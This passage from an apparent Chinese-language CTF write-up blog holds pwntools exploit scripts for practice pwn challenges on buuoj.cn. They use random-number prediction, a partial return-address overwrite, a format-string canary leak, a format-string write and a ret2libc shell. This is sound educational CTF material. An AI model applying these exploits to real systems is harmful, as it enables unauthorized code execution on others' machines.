ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29429</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token operator\">!=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number?\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"p1eee\"><a class=\"markdownIt-Anchor\" href=\"#p1eee\">#</a> p1eee</h2>\n<p>pie<br>\n 程序保护启动了 pie，但没开启 canary。<br>\n栈溢出覆盖返回地址低位即可。<br>\n要修改的地址和原本地址很近，即后门函数为 0x1264，原返回地址为 0x1297，所以只需修改一个字节即可（其实也只够修改一个字节）。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x6c</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28268</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> week2</h1>\n<h2 id=\"canary\"><a class=\"markdownIt-Anchor\" href=\"#canary\">#</a> canary</h2>\n<p>format string, canary<br>\n 用 printf 漏洞泄露 canary，然后组成 payload。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./canary')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27529</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span><span class=\"token operator\">-</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x401262</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p\\n'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift?\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'magic'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"secret_number-x2\"><a class=\"markdownIt-Anchor\" href=\"#secret_number-x2\">#</a> secret_number x2</h2>\n<p>format string<br>\n 猜数字，利用 printf 将储存的 secret 变量修改为设定值，然后输入设定值完成 if 条件判断。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./secretnumber')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29618</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x404C</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#p.send(b'%16$p\\n')</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#add1 = p.recvuntil</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#add2 = add1 - 0xc0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p\\n'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>target <span class=\"token operator\">+=</span> main_a <span class=\"token operator\">-</span> <span class=\"token number\">0x12f5</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] the secret address is '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#p.send(b'%16$p\\n')</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#add1 = p.recvuntil</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#add2 = add1 - 0xc0</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aa%9$n'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>想了想，用 week1 的 random 的思路应该也能做，而且更快。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./secretnumber'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',29429)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me some gift?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Guess the number'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h2>\n<p>ret2libc3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25746</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./ret2libc')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>exit_a <span class=\"token operator\">=</span> main_a</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0400763</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0400506</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Show me your magic again\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc = ELF('./libc-2.23.so')</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>exit_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"stack-migration\"><a 